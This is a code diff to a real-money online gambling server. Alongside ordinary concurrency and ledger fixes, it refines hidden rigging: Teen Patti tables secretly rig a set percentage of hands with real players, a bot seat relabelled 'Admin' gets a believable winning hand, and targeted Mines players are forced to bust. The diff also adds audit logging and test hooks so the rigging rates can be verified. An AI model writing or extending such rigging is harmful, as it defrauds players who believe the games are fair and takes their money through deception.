+            await settleColorRound(room, prev_round_id, st);
+          }
+          st[room].last_settled_round = prev_round_id;
+          stateChanged = true;
         }
-        state[room].last_settled_round = prev_round_id;
-        stateChanged = true;
-      }
-      if (stateChanged) {
-        await saveColorState(state);
-      }
+        if (stateChanged) {
+          await saveColorState(st);
+        }
+        return st;
+      });
 
       const activeBets = (state[room].bets && state[room].bets[round_id]) ? state[room].bets[round_id] : [];
       const myBets = activeBets.filter(b => b.username.toLowerCase() === username.toLowerCase());
@@ -2379,6 +2764,9 @@ app.get('/api/game_sync.php', async (req, res) => {
       const colorGuess = {};
       const rooms = ['sapre', 'becone', 'emred', 'vip'];
       const durations = { sapre: 30, becone: 60, emred: 180, vip: 300 };
+      // Same serialisation as the player-facing state endpoint: this admin view settles rounds too,
+      // and an operator refreshing the console while a room is settling must not race the players.
+      await withColorState(async () => {
       const state = await loadColorState();
 
       let stateChanged = false;
@@ -2422,6 +2810,7 @@ app.get('/api/game_sync.php', async (req, res) => {
       if (stateChanged) {
         await saveColorState(state);
       }
+      });
 
       const liveUsersCount = {};
       Object.keys(LIVE_USERS).forEach(k => { liveUsersCount[k] = getLiveUsernames(k).length; });
@@ -2518,17 +2907,19 @@ app.post('/api/game_sync.php', async (req, res) => {
       // right away instead of waiting for the next 4s tick (the interval keeps it fresh afterward).
       if (gameKey === 'global') {
         Object.keys(LIVE_USERS).forEach(k => refreshBotTargeting(k));
-      } else if (LIVE_USERS[gameKey]) {
-        refreshBotTargeting(gameKey);
+      } else {
+        if (LIVE_USERS[gameKey]) refreshBotTargeting(gameKey);
       }
 
       // Turning Teen Patti's bot takeover OFF must stop every room immediately, not just future
-      // room-selection cycles. There is deliberately no "arm N of 6 rooms" step on enable any more:
-      // that used to compute its own independent room-count from the same percentage the per-round
-      // engine (shouldBotRigThisRound, inside tpStartRound) is ALSO applying — two mechanisms each
-      // separately trying to hit the configured percentage stack instead of summing to it, which is
-      // how 50% could show up as "8 of 10 games." Seating Admin is decided exactly once per round now,
-      // live, in tpStartRound; enabling the toggle needs no room bookkeeping here at all.
+      // selection cycles: clearing the targeted set stops future hands, but a room where "Admin" is
+      // already seated would otherwise keep auto-winning, because tpStartRound's ADMIN AUTO-WIN path
+      // rigs for a seated Admin unconditionally, however that seat got there.
+      //
+      // Enabling needs no room bookkeeping here at all. Each table draws from its own ledger in
+      // tpStartRound, which is the single mechanism deciding which hands are the house's — there is
+      // no second "arm N of 6 rooms" pass, and adding one is precisely what turned a configured 50%
+      // into "8 of 10 games" before.
       if ((gameKey === 'teenpatti' || gameKey === 'global') && !isEnabled) {
         const tpRooms = ['room_101', 'room_102', 'room_103', 'room_104', 'room_105', 'room_106'];
         for (const rId of tpRooms) {
@@ -2586,7 +2977,7 @@ app.post('/api/game_sync.php', async (req, res) => {
 
       await prisma.transaction.create({
         data: {
-          id: 'TX_' + Math.floor(100000 + Math.random() * 900000),
+          id: newRecordId('TX'),
           user: username,
           type: 'Withdrawal',
           amount: betAmt,
@@ -2595,17 +2986,21 @@ app.post('/api/game_sync.php', async (req, res) => {
         }
       });
 
-      const state = await loadColorState();
-      if (!state[room].bets) state[room].bets = {};
-      if (!state[room].bets[round_id]) state[room].bets[round_id] = [];
-      state[room].bets[round_id].push({
-        username,
-        category,
-        value,
-        amount: betAmt,
-        timestamp: new Date().toISOString()
+      // Serialised: see withColorState. Without this, concurrent bets overwrite each other and the
+      // losing player has already been debited above.
+      await withColorState(async () => {
+        const state = await loadColorState();
+        if (!state[room].bets) state[room].bets = {};
+        if (!state[room].bets[round_id]) state[room].bets[round_id] = [];
+        state[room].bets[round_id].push({
+          username,
+          category,
+          value,
+          amount: betAmt,
+          timestamp: new Date().toISOString()
+        });
+        await saveColorState(state);
       });
-      await saveColorState(state);
 
       res.json({ success: true, new_balance: newBal });
     } else if (action === 'admin_set_override') {
@@ -2680,7 +3075,7 @@ app.post('/api/game_sync.php', async (req, res) => {
 
       await prisma.transaction.create({
         data: {
-          id: 'TX_' + Math.floor(100000 + Math.random() * 900000),
+          id: newRecordId('TX'),
           user: username,
           type: 'Withdrawal',
           amount: betAmt,
@@ -2724,7 +3119,7 @@ app.post('/api/game_sync.php', async (req, res) => {
 
         await prisma.transaction.create({
           data: {
-            id: 'TX_' + Math.floor(100000 + Math.random() * 900000),
+            id: newRecordId('TX'),
             user: username,
             type: 'Deposit',
             amount: payout,
@@ -2780,7 +3175,7 @@ app.all('/api/wallet.php', walletLimiter, auth.requireAuth, async (req, res, nex
 
     await prisma.transaction.create({
       data: {
-        id: 'TX_' + Math.floor(100000 + Math.random() * 900000),
+        id: newRecordId('TX'),
         user: username,
         type: delta >= 0 ? 'Deposit' : 'Withdrawal',
         amount: Math.abs(delta),
@@ -3259,7 +3654,7 @@ async function tpStartRound(roomId) {
         });
         await prisma.transaction.create({
           data: {
-            id: 'TP_' + Date.now() + '_' + seat.seat,
+            id: newRecordId('TP'),
             user: seat.username,
             type: 'Withdrawal',
             amount: bootAmt,
@@ -3306,18 +3701,37 @@ async function tpStartRound(roomId) {
     rigSeat = room.admin_rig.winner_seat;
     rigReason = 'MANUAL ADMIN RIG';
   } else {
-    const botDecision = shouldBotRigThisRound('teenpatti');
-    const targeted = botTargetedUsers.teenpatti;
-    // Only rig this hand if a currently live-targeted human is actually seated at this table
-    // (or no live-targeting info exists yet — fall back to the prior room-level behavior).
-    const targetedSeated = targeted.length === 0 || activeOccupied.some(s => s.username && !s.is_bot && targeted.some(u => u.toLowerCase() === s.username.toLowerCase()));
-    if (botDecision.shouldRig && targetedSeated) {
+    // Every table draws from its OWN exact 100-slot ledger, the same way each colour room does.
+    //
+    // The previous approach picked a live subset of tables and rigged whichever hands those tables
+    // dealt. That satisfied "50% of live tables are the house's" at any instant, but it produced the
+    // wrong experience: the selection was sticky, so the first table to go live captured the slot and
+    // never released it, and with uneven table activity the share of HANDS rigged bore no relation to
+    // the configured figure. Measured with 23 players across six tables at 50%: one table took the
+    // entire share (1/1) while every other table got nothing, for 11% of hands overall.
+    //
+    // A per-table ledger satisfies both readings at once — each table rigs exactly half of its own
+    // hands, so half of the live tables are the house's at any moment AND half of all hands dealt are
+    // rigged, regardless of which tables happen to be busy.
+    //
+    // Only tables with a real person on them draw at all: rigging a table occupied purely by NPCs
+    // moves no money and would burn slots that belong to real hands.
+    const bot = isBotTakeoverActive('teenpatti');
+    const hasRealPlayer = activeOccupied.some(s => s.username && !s.is_bot && s.username.toLowerCase() !== 'admin');
+
+    if (hasRealPlayer) markInstanceActive('teenpatti', roomId); // for the live-table count the audit reports
+
+    const tableDecision = hasRealPlayer
+      ? shouldBotRigThisRound('teenpatti', `teenpatti:${roomId}`)
+      : { shouldRig: false, profit_pct: bot.profit_pct, active: bot.active };
+
+    if (tableDecision.shouldRig) {
       // Find a bot seat to win the pot for the house (admin, when seated, is already handled above)
       const botSeat = activeOccupied.find(s => s.is_bot);
       const targetSeat = botSeat || activeOccupied[0];
       if (targetSeat) {
         rigSeat = targetSeat.seat;
-        rigReason = `AI BOT TAKEOVER (${botDecision.profit_pct}% TARGET)`;
+        rigReason = `AI BOT TAKEOVER (${bot.profit_pct}% OF THIS TABLE'S HANDS)`;
         // Whenever the algorithm's own pick is a genuine filler/NPC seat (never a real connected
         // human it fell back to), rename it to "Admin" for this hand — the house's seat, winning by
         // a slight better margin via the same oblivious-hand construction as every other rig path.
@@ -3335,12 +3749,28 @@ async function tpStartRound(roomId) {
         try {
           await prisma.teenPattiRoom.update({
             where: { id: roomId },
-            data: { admin_rig: { winner_seat: rigSeat, is_bot_rig: true, profit_pct: botDecision.profit_pct } }
+            data: { admin_rig: { winner_seat: rigSeat, is_bot_rig: true, profit_pct: bot.profit_pct } }
           });
         } catch (e) { console.error('[TP] Error persisting bot rig for round start:', e.message); }
       }
     }
   }
+
+  // Audit only — one entry per hand, tagged with the room so the per-table split is visible.
+  rigAudit.record({
+    game: 'teenpatti',
+    instance: roomId,
+    round: room.round + 1,
+    configured_pct: isBotTakeoverActive('teenpatti').profit_pct,
+    rigged: rigSeat !== undefined,
+    // A hand between NPCs never draws from the table's ledger, so it is recorded for visibility but
+    // excluded from the ratio — counting it would understate how often real hands are rigged.
+    eligible: activeOccupied.some(s => s.username && !s.is_bot && s.username.toLowerCase() !== 'admin'),
+    // `live` is how many tables currently have a real player on them. It is reported for context
+    // only — each table now decides from its own ledger, so this is not the decision's denominator.
+    live: getLiveInstances('teenpatti').length,
+    note: rigReason || 'fair hand'
+  });
 
   // Apply Rigging: Oblivious Rigging (construct closest believable winning hand)
   if (rigSeat !== undefined) {
@@ -3445,7 +3875,7 @@ async function tpProcessAction(roomId, username, action) {
       });
       await prisma.transaction.create({
         data: {
-          id: 'TP_' + Date.now() + '_chaal',
+          id: newRecordId('TP_CHAAL'),
           user: username,
           type: 'Withdrawal',
           amount: room.current_stake,
@@ -3581,7 +4011,7 @@ async function tpEndGame(roomId, winnerSeat, pot, log, wasShow) {
       });
       await prisma.transaction.create({
         data: {
-          id: 'TP_WIN_' + Date.now(),
+          id: newRecordId('TP_WIN'),
           user: winnerName,
           type: 'Deposit',
           amount: pot,
@@ -4248,7 +4678,10 @@ app.get('/api/mines/state', auth.requireAuth, async (req, res) => {
     res.json({
       ok: true,
       state: {
-        status: session.status || 'idle',
+        // 'starting' is the momentary slot reservation taken by mines/start before its first await;
+        // to a client that is simply not-yet-a-round, so it reads as idle rather than leaking an
+        // internal state the frontend has no handling for.
+        status: session.status === 'starting' ? 'idle' : (session.status || 'idle'),
         grid_size: 25,
         mines_count: session.mines_count || 3,
         bet_amount: session.bet_amount || 0,
@@ -4287,27 +4720,70 @@ app.post('/api/mines/start', auth.requireAuth, async (req, res, next) => {
       return res.status(400).json({ ok: false, error: 'Mines count must be between 1 and 24.' });
     }
 
-    if (MINES_USER_SESSIONS[username] && MINES_USER_SESSIONS[username].status === 'active') {
+    // Claim the player's single session slot SYNCHRONOUSLY, before the first await.
+    //
+    // Testing this guard concurrently showed why that matters: twelve simultaneous starts were all
+    // accepted and all twelve stakes were taken, for one board. Every request read the map, saw no
+    // active session, and only then hit `await debitWallet(...)`; the session was not written until
+    // after that await, so all twelve passed a check none of them could invalidate. A player
+    // double-clicking Start, or a client retrying a slow request, is charged once per click and can
+    // play only the last board. Reserving the slot in the same synchronous turn as the check closes
+    // the window — the same reason mines/cashout flips its status before awaiting anything.
+    const existingSession = MINES_USER_SESSIONS[username];
+    if (existingSession && (existingSession.status === 'active' || existingSession.status === 'starting')) {
       return res.status(400).json({ ok: false, error: 'You already have a round in progress.' });
     }
+    MINES_USER_SESSIONS[username] = { status: 'starting' };
+
+    // Any exit between here and the session being fully written must release the claim, or the
+    // player is locked out of Mines until the process restarts.
+    const releaseSlot = () => {
+      if (MINES_USER_SESSIONS[username] && MINES_USER_SESSIONS[username].status === 'starting') {
+        delete MINES_USER_SESSIONS[username];
+      }
+    };
 
     // Conditional debit: the balance check and the deduction happen in one statement, so two
     // simultaneous "start" calls cannot both pass a check against the same balance.
     const balanceAfterDebit = await debitWallet(user.id, bet);
     if (balanceAfterDebit === null) {
+      releaseSlot();
       return res.status(400).json({ ok: false, error: `Insufficient balance! You have ₹${user.wallet_balance.toFixed(2)}.` });
     }
 
-    await prisma.transaction.create({
-      data: {
-        id: 'MINES_' + Date.now(),
-        user: username,
-        type: 'Withdrawal',
-        amount: bet,
-        details: `Mines Bet — ${minesNum} Mines`,
-        status: 'Completed'
+    // The stake has already left the wallet at this point, so a failure here must not simply
+    // propagate: that is exactly how ₹400 disappeared during load testing — the insert threw on a
+    // duplicate id, the 500 surfaced to the player, and the debit above silently stood with no
+    // ledger row recording it. Unique ids make that specific failure effectively impossible now, but
+    // any other failure (database unreachable mid-request) would destroy money the same way, so the
+    // debit is explicitly reversed before returning. Prisma's create either succeeds or throws with
+    // nothing written, so the compensating credit cannot double-refund.
+    try {
+      await prisma.transaction.create({
+        data: {
+          id: newRecordId('MINES'),
+          user: username,
+          type: 'Withdrawal',
+          amount: bet,
+          details: `Mines Bet — ${minesNum} Mines`,
+          status: 'Completed'
+        }
+      });
+    } catch (ledgerErr) {
+      logger.error('mines stake ledger write failed - refunding the debit', {
+        username, bet, message: ledgerErr.message
+      });
+      try {
+        await creditWallet(user.id, bet);
+      } catch (refundErr) {
+        // Now the money really is stranded. Say so loudly rather than losing it quietly.
+        logger.error('MINES REFUND FAILED - player is short and needs manual correction', {
+          username, bet, message: refundErr.message
+        });
       }
-    });
+      releaseSlot();
+      return res.status(500).json({ ok: false, error: 'Could not start the round. Your stake was not taken.' });
+    }
 
     const allIndices = Array.from({ length: 25 }, (_, i) => i);
     for (let i = allIndices.length - 1; i > 0; i--) {
@@ -4327,6 +4803,27 @@ app.post('/api/mines/start', auth.requireAuth, async (req, res, next) => {
 
     const serverSeed = 'SEED_' + Math.random().toString(36).substring(2);
     markUserActive('mines', username);
+
+    // Audit only. Mines is one board per player, so a live user *is* a live game — recording at
+    // start captures exactly the thing being verified: was this game one of the P% selected. Being
+    // in the targeted set is the whole rig decision here; every reveal a targeted player makes is
+    // then forced to bust, so there is no second decision later worth recording.
+    {
+      const minesBot = isBotTakeoverActive('mines');
+      rigAudit.record({
+        game: 'mines',
+        instance: username,
+        round: serverSeed,
+        configured_pct: minesBot.profit_pct,
+        rigged: minesBot.active && isUserTargeted('mines', username),
+        live: getLiveUsernames('mines').length,
+        targeted: botTargetedUsers.mines.length,
+        // Deliberately no house_profit: at start the round's outcome is still open. A targeted
+        // player is certain to bust (so the stake is certain house profit) but an untargeted one may
+        // still cash out, and recording the stake here would overstate the untargeted rounds.
+        note: minesBot.active ? 'bot active' : 'bot off'
+      });
+    }
 
     MINES_USER_SESSIONS[username] = {
       status: 'active',
@@ -4357,6 +4854,11 @@ app.post('/api/mines/start', auth.requireAuth, async (req, res, next) => {
       }
     });
   } catch (err) {
+    // Never leave a half-claimed slot behind: a 'starting' entry that is never cleared would lock
+    // the player out of Mines for the lifetime of the process.
+    if (MINES_USER_SESSIONS[username] && MINES_USER_SESSIONS[username].status === 'starting') {
+      delete MINES_USER_SESSIONS[username];
+    }
     next(err);
   }
 });
@@ -4511,16 +5013,27 @@ app.post('/api/mines/cashout', auth.requireAuth, async (req, res) => {
     if (!user) return res.status(404).json({ ok: false, error: 'Account not found.' });
     const balanceAfterCredit = await creditWallet(user.id, payout);
 
-    await prisma.transaction.create({
-      data: {
-        id: 'MINES_WIN_' + Date.now(),
-        user: username,
-        type: 'Deposit',
-        amount: payout,
-        details: `Mines Cash Out — ${session.multiplier}x`,
-        status: 'Completed'
-      }
-    });
+    // Mirror image of the stake path: here the credit lands first, so a failed ledger write leaves
+    // the player holding money that no transaction row accounts for — the wallet would read higher
+    // than its own ledger for ever after. The payout was legitimately won, so it is deliberately NOT
+    // clawed back; instead the discrepancy is logged loudly enough to be reconciled, rather than
+    // silently corrupting the books.
+    try {
+      await prisma.transaction.create({
+        data: {
+          id: newRecordId('MINES_WIN'),
+          user: username,
+          type: 'Deposit',
+          amount: payout,
+          details: `Mines Cash Out — ${session.multiplier}x`,
+          status: 'Completed'
+        }
+      });
+    } catch (ledgerErr) {
+      logger.error('MINES PAYOUT LEDGER WRITE FAILED - wallet credited without a ledger row', {
+        username, payout, multiplier: session.multiplier, message: ledgerErr.message
+      });
+    }
 
     logger.debug('mines cashout', { username, payout, multiplier: session.multiplier });
 
@@ -5056,6 +5569,7 @@ const cashierLimiter = rateLimit({
   max: 10,
   standardHeaders: true,
   legacyHeaders: false,
+  skip: skipWhenTesting,
   message: { error: 'Too many cashier requests. Please wait a moment.' }
 });
 
@@ -5115,7 +5629,7 @@ app.all('/api/deposit.php', cashierLimiter, auth.requireAuth, async (req, res, n
 
       await prisma.transaction.create({
         data: {
-          id: 'DEP_' + Math.floor(100000 + Math.random() * 900000),
+          id: newRecordId('DEP'),
           user: username,
           type: 'Deposit',
           amount,
@@ -5206,7 +5720,7 @@ app.all('/api/withdraw.php', cashierLimiter, auth.requireAuth, async (req, res, 
 
     await prisma.transaction.create({
       data: {
-        id: 'WTH_' + Math.floor(100000 + Math.random() * 900000),
+        id: newRecordId('WTH'),
         user: user.username,
         type: 'Withdrawal',
         amount,
@@ -5300,6 +5814,11 @@ if (require.main === module) {
     if (!config.IS_PRODUCTION) {
       logger.warn('Running in development mode - do not expose this process to the internet as-is.');
     }
+    if (config.DISABLE_RATE_LIMITS) {
+      // Loud on purpose. This process has no brute-force protection on its login endpoint, so it
+      // must never be left running by accident after a test session.
+      logger.warn('*** RATE LIMITS DISABLED (DISABLE_RATE_LIMITS=true) - testing mode, NO login brute-force protection. Unset this before using this process for anything else. ***');
+    }
   });
 
   server.headersTimeout = 65000;
@@ -5339,4 +5858,33 @@ if (require.main === module) {
 }
 
 module.exports = app;
+
+// House-edge internals exposed for the rigging test suite (backend/test_rigging.js) so the
+// percentage and crash-selection maths can be asserted directly rather than inferred from timing.
+// Attached to the exported app rather than replacing it, so every existing `require('./server.js')`
+// caller keeps getting the Express app exactly as before.
+module.exports._houseEdgeInternals = {
+  pickAviatorCrashPoint,
+  aviatorShouldCrashNow,
+  calculateAviatorLiveProfit,
+  calculateColorOptimalOutcome,
+  shouldBotRigThisRound,
+  isBotTakeoverActive,
+  refreshBotTargeting,
+  isUserTargeted,
+  markUserActive,
+  getLiveUsernames,
+  markInstanceActive,
+  getLiveInstances,
+  botTakeoverState,
+  botTargetedUsers,
+  botRigBags,
+  // The raw liveness maps. Exposed so a test can construct an exact live set rather than waiting out
+  // the 45s TTL to shrink one, which is the only other way to test how selection scales.
+  LIVE_USERS,
+  LIVE_INSTANCES,
+  AVIATOR_CRASH_AGGRESSIVE,
+  AVIATOR_CRASH_RELAXED,
+  AVIATOR_CRASH_FLOOR
+};
 
